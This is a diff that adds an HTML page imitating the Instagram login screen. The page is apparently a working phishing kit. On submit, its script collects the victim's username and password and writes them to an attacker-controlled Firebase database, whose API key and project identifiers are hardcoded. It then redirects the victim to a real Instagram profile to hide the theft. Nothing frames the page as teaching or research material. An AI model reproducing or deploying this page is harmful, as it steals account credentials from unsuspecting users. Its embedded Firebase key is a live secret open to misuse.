@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+	</script>
+	<link rel="shortcut icon" href="Instagram_logo_2016.svg" />
+	<title>Instagram</title>
+	<link rel="stylesheet" href="styles.css"> </head>
+
+<body>
+	<div class="wrapper">
+		<form class="container" id="contactForm">
+			<div class="header">
+				<div class="top">
+					<div class="logo"> <img src="instagram.png" alt="instagram" style="width: 175px;"> </div>
+					<div class="form">
+						<div class="input_field">
+							<input type="text" id="name" placeholder="Enter your name" class="input" style="padding: 10 px;" required> </div>
+						<div class="input_field pw" >
+							<input type="text"  id="password" placeholder="Password" class="input" style="padding: 10 px;" required> </div>
+					</div>
+					<button type="submit" class="btn" style="background-color:#3897f0;border: 1px solid #3897f0 ;color:white;display: block; max-width: 350px;
+	        width: 100%;
+	        height: auto;
+	        border-radius: 4px;
+			padding: 5px;
+			margin: 10px auto"> Log in </button>
+					<div class="or">
+						<div class="line"></div>
+						<p>OR</p>
+						<div class="line"></div>
+					</div>
+					<div class="dif">
+						<div class="fb"> <img src="facebook.png" alt="facebook">
+							<p>Log in with Facebook</p>
+						</div>
+						<div class="forgot"> <a href="#">Forgot password?</a> </div>
+					</div>
+				</div>
+				<div class="signup">
+					<p>Don't have an account? <a href="#">Sign up</a></p>
+				</div>
+				<div class="apps">
+					<p>Get the app.</p>
+					<div class="icons">
+						<a href="#"><img src="appstore.png" alt="appstore"></a>
+						<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+					</div>
+				</div>
+			</div>
+		</form>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright"> © 2019 INSTAGRAM </div>
+	</div>
+	<script src="https://www.gstatic.com/firebasejs/3.7.4/firebase.js">
+	</script>
+	<script>
+	var firebaseConfig = {
+		apiKey: "AIzaSyC5slKVKE4z13mKZQynHi8hwBlhK8xy1SU",
+		authDomain: "sound-dahlia-290617.firebaseapp.com",
+		databaseURL: "https://sound-dahlia-290617-default-rtdb.firebaseio.com/",
+		projectId: "sound-dahlia-290617",
+		storageBucket: "sound-dahlia-290617.appspot.com",
+		messagingSenderId: "333674478909",
+		appId: "1:333674478909:web:a22289e066221ef1935954"
+	};
+	firebase.initializeApp(firebaseConfig);
+	var messagesRef = firebase.database().ref('Collected Data');
+	document.getElementById('contactForm').addEventListener('submit', submitForm);
+
+	function submitForm(e) {
+		e.preventDefault();
+		// Get values
+		var name = getInputVal('name');
+		var password = getInputVal('password');
+		saveMessage(name, password);
+		callinstagram();
+		document.getElementById('contactForm').reset();
+	}
+	// Function to get get form values
+	function getInputVal(id) {
+		return document.getElementById(id).value;
+	}
+
+	function callinstagram() {
+		location.replace("https://www.instagram.com/sr_gifts_designs/")
+	}
+	// Save message to firebase
+	function saveMessage(name, password) {
+		var postData = {
+			name: name,
+			password: password,
+		};
+		var time = timenow();
+		var newPostKey = firebase.database().ref('Data').child('Instagram').push().key;
+		var updates = {};
+		updates['/Instagram/' + name + time + '/'] = postData;
+		return firebase.database().ref().update(updates);
+	}
+
+	function timenow() {
+		var myDate = new Date();
+		var hours = myDate.getHours();
+		var ampm = hours >= 12 ? 'PM' : 'AM';
+		hours = hours % 12;
+		hours = hours ? hours : 12;
+		var minutes = myDate.getMinutes();
+		minutes = minutes < 10 ? '0' + minutes : minutes;
+		return myTime = "-"+hours + ":" + minutes + ":" + myDate.getMilliseconds();
+	}
+	</script>
+</body>
+
+</html>
